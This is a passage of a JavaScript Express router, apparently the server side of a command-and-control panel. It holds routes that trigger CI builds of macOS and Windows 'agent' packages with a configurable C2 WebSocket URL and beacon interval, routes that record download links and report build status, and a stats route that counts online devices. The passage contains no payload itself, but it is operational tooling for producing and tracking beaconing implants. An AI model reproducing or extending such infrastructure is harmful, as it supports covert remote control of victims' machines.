      beaconInterval: String(req.body.beaconInterval || BEACON_DEFAULT),
    });
    if (!r.ok) return res.status(502).json({ error: "GitHub dispatch failed", status: r.status });
    logger.info(`[Build] macOS pkg build triggered by ${req.admin.email}`);
    res.json({ ok: true, message: "macOS build triggered — pkg ready in ~3 min", repo: ghRepo });
  } catch (err) {
    res.status(500).json({ error: "Internal error", detail: err.message });
  }
});

router.post("/build/macos/notify", (req, res) => {
  const secret   = process.env.RENDER_APK_NOTIFY_SECRET;
  const provided = req.headers["x-notify-secret"] || req.body?.secret;
  if (secret && provided !== secret) return res.status(401).json({ error: "Invalid secret" });
  const { downloadUrl, build } = req.body || {};
  if (!downloadUrl) return res.status(400).json({ error: "downloadUrl required" });
  binaryUrls.macos = downloadUrl;
  logger.info(`[Build] macOS notify: ${downloadUrl} (build=${build})`);
  res.json({ ok: true, platform: "macos", downloadUrl });
});

router.get("/build/macos/status", authRequired, (req, res) => {
  const url = binaryUrls.macos;
  res.json({
    platform: "macos",
    status: url ? "completed" : "not_built",
    downloadUrl: url,
    message: url ? null : "Binary not built yet. Trigger via POST /v1/build/macos",
  });
});

// ── Windows build ─────────────────────────────────────────────────────────
router.post("/build/windows", authRequired, async (req, res) => {
  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;
  if (!ghToken || !ghRepo) {
    return res.json({
      ok: false,
      localBuild: true,
      message: "GitHub CI not configured. Build manually: Compress-Archive -Path software-windows\\* -DestinationPath bixtx-agent-windows.zip",
    });
  }
  try {
    const r = await triggerGHWorkflow(ghToken, ghRepo, "build-windows.yml", {
      c2WsUrl:        req.body.c2WsUrl || C2_URL_DEFAULT,
      beaconInterval: String(req.body.beaconInterval || BEACON_DEFAULT),
    });
    if (!r.ok) return res.status(502).json({ error: "GitHub dispatch failed", status: r.status });
    logger.info(`[Build] Windows zip build triggered by ${req.admin.email}`);
    res.json({ ok: true, message: "Windows build triggered — zip ready in ~2 min", repo: ghRepo });
  } catch (err) {
    res.status(500).json({ error: "Internal error", detail: err.message });
  }
});

router.post("/build/windows/notify", (req, res) => {
  const secret   = process.env.RENDER_APK_NOTIFY_SECRET;
  const provided = req.headers["x-notify-secret"] || req.body?.secret;
  if (secret && provided !== secret) return res.status(401).json({ error: "Invalid secret" });
  const { downloadUrl, build } = req.body || {};
  if (!downloadUrl) return res.status(400).json({ error: "downloadUrl required" });
  binaryUrls.windows = downloadUrl;
  logger.info(`[Build] Windows notify: ${downloadUrl} (build=${build})`);
  res.json({ ok: true, platform: "windows", downloadUrl });
});

router.get("/build/windows/status", authRequired, (req, res) => {
  const url = binaryUrls.windows;
  res.json({
    platform: "windows",
    status: url ? "completed" : "not_built",
    downloadUrl: url,
    message: url ? null : "Binary not built yet. Trigger via POST /v1/build/windows",
  });
});

// ── GET /v1/stats ─────────────────────────────────────────────────────────
router.get("/stats", authRequired, (req, res) => {
  const devices = store.devices.getAll();
  const online  = wsHandler.getOnlineDevices();
  res.json({
    devices: {
      total:   devices.length,
      online:  online.length,
      offline: devices.length - online.length,
    },
    server: { uptime: process.uptime(), version: "4.7.2", ts: Date.now() },
  });
});

module.exports = router;
module.exports.enqueueUpgradeProposal = enqueueUpgradeProposal;
